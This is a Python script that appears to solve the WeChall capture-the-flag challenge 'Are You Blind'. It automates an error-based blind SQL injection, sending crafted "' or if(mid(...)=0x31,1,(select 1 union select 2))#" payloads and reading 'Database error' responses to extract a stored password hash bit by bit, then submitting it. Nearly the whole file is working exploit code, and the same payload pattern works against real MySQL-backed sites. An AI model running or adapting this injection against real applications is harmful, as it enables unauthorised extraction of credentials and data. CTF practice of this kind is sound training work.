import urllib.parse, urllib.request

SESSION = '**secret**';

def reset():
	url = 'http://www.wechall.net/challenge/Mawekl/are_you_blind/index.php?reset=me'
	headers = {
		'Cookie':'WC=' + SESSION
	}
	req = urllib.request.Request(url, None, headers)
	urllib.request.urlopen(req)

def auth(password):
	url = 'http://www.wechall.net/challenge/Mawekl/are_you_blind/index.php'
	post_data = {
		'mybutton':'Enter',
		'thehash':password
	}
	headers = {
		'Cookie':'WC=' + SESSION,
		'Content-Type':'application/x-www-form-urlencoded'
	}
	req = urllib.request.Request(url, urllib.parse.urlencode(post_data).encode('utf-8'), headers)
	res = urllib.request.urlopen(req).read().decode()
	print(res)

def inject(a, b):
	url = 'http://www.wechall.net/challenge/Mawekl/are_you_blind/index.php'
	post_data = {
		'inject':'Inject',
		'injection':"' or if(" \
			'mid(lpad(conv(mid(password,' + str(a + 1) + ',1),16,2),4,0),' + str(b + 1) + ',1)=0x31' \
			",1,(select 1 union select 2))#"
	}
	headers = {
		'Cookie':'WC=' + SESSION,
		'Content-Type':'application/x-www-form-urlencoded'
	}
	req = urllib.request.Request(url, urllib.parse.urlencode(post_data).encode('utf-8'), headers)
	res = urllib.request.urlopen(req).read().decode()

	return '1' if 'Database error' not in res else '0'

def main():
	reset()
	for i in range(3):
		pw = ''
		for a in range(0, 32):
			temp = ''
			for b in range(0, 4):
				temp += inject(a, b)
				print(temp)

			pw += hex(int(temp, 2))[2:].upper()
			print('Password:', pw)
		auth(pw)

if __name__ == '__main__':
	main()